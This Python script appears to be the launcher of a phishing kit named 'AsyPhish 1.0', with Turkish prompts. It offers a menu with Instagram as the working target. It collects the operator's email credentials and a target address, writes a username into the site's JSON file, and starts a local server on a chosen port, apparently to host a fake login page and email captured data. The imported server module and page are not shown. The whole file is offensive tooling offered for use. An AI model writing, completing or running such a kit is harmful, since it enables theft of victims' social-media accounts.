import server
import listen
import json


def main(media):
    username = input("Kullanıcı adı giriniz\nasy >> ")
    sender_email = input("Mail adresinizi giriniz\nasy >> ")
    password = input("Mail adresinizin parolasını giriniz\nasy >> ")
    toMail = input("Hedef mail adresini giriniz\nasy >> ")
    port = input("Server için port giriniz (4444,8080,9090)\nasy >> ")
    u_json = {
        "username": username
    }
    with open('site/public/js/df.json', 'w') as json_dosya:
        json.dump(u_json, json_dosya)

    server.start(int(port), media, username, sender_email, toMail, password)




print("""

AsyPhish version: 1.0

[1] Instagram
[2] Facebook "Coming in version 1.1"
[3] Twitter "Coming in version 1.1"
[99] Quit
""")
try:
    media = ""
    while True:
        select = input("asy >> ")
        if select == "1":
            media = "Instagram"
            main(media)
        elif select == "2":
            media = "Facebook"
            pass

        elif select == "3":
            media = "Twitter"
            pass
        elif select == "99":
            quit()
        else:
            print("hatalı seçim")

except KeyboardInterrupt:
    print("hata")
    quit()
